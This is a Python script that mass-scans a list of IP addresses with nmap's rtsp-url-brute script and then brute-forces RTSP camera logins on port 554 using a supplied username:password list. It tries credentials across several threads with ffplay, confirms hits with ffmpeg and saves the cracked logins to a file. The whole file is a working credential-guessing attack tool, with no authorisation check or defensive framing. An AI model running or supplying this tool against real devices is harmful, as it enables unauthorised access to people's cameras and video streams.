import os
import subprocess
import threading
import queue
import time

def run_nmap(ip):
    """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
    output_file = f"{ip}.txt"
    cmd = ["nmap", "--script", "rtsp-url-brute", "-p", "554", ip]
    with open(output_file, "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL, text=True)
    print(f"[+] Nmap scan completed for {ip}, results saved in {output_file}")

def verify_success(ip, username, password):
    """Uses ffmpeg to verify if the login is actually successful."""
    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
    print(f"[?] Verifying credentials: {rtsp_url}")

    try:
        result = subprocess.run(["ffmpeg", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-f", "null", "-"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)

        if any(err in result.stderr for err in ["Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            print(f"[-] False positive: {rtsp_url} (Verification failed)")
            return False
        
        print(f"[+] CONFIRMED SUCCESS: {rtsp_url}")
        with open("valid_credentials.txt", "a") as f:
            f.write(f"{ip} {username}:{password}\n")
        return True
    except subprocess.TimeoutExpired:
        print(f"[-] Verification timeout: {rtsp_url}")
    
    return False

def attempt_login(ip, username, password):
    """Attempts RTSP login and verifies success."""
    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
    print(f"[*] Trying {rtsp_url}")

    try:
        result = subprocess.run(["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "7"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)

        if any(err in result.stderr for err in ["401 Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            print(f"[-] Failed: {rtsp_url} (Invalid credentials)")
        else:
            print(f"[+] Possible success: {rtsp_url}")

            # Verify credentials before considering success
            return verify_success(ip, username, password)
    
    except subprocess.TimeoutExpired:
        print(f"[-] Failed: {rtsp_url} (Timeout)")
    
    return False

def brute_force_worker(ip, creds_queue, success_list):
    """Worker function to process the credential queue."""
    while not creds_queue.empty():
        username, password = creds_queue.get()
        if attempt_login(ip, username, password):
            success_list.append((ip, username, password))  # Store success credentials
        creds_queue.task_done()

def brute_force_rtsp(ip, creds):
    """Attempts RTSP brute-force login using multiple threads for a given IP."""
    creds_queue = queue.Queue()
    success_list = []  # List to store successful logins

    # Populate the queue with all username-password combinations
    for cred in creds:
        username, password = cred.split(":", 1)
        creds_queue.put((username, password))

    # Launch threads
    threads = []
    num_threads = min(5, len(creds))  # Limit concurrent login attempts
    for _ in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(ip, creds_queue, success_list))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    creds_queue.join()
    for thread in threads:
        thread.join()

    return success_list  # Return all successful credentials for this IP

def worker(ip, creds, success_results):
    run_nmap(ip)
    success_results[ip] = brute_force_rtsp(ip, creds)

def main(ip_list_file, creds_file):
    if not os.path.exists(ip_list_file):
        print(f"[!] IP list file {ip_list_file} not found!")
        return
    if not os.path.exists(creds_file):
        print(f"[!] Credentials file {creds_file} not found!")
        return

    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    with open(creds_file, "r") as f:
        creds = [line.strip() for line in f if ":" in line]

    success_results = {}
    threads = []
    
    for ip in ips:
        thread = threading.Thread(target=worker, args=(ip, creds, success_results))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # Save all successfully cracked credentials
    with open("valid_credentials.txt", "a") as f:
        for ip, success_creds in success_results.items():
            for username, password in success_creds:
                f.write(f"{ip} {username}:{password}\n")

if __name__ == "__main__":
    ip_list = "ips.txt"  # List of IPs, one per line
    creds_list = "creds.txt"  # List of credentials in user:pass format
    main(ip_list, creds_list)
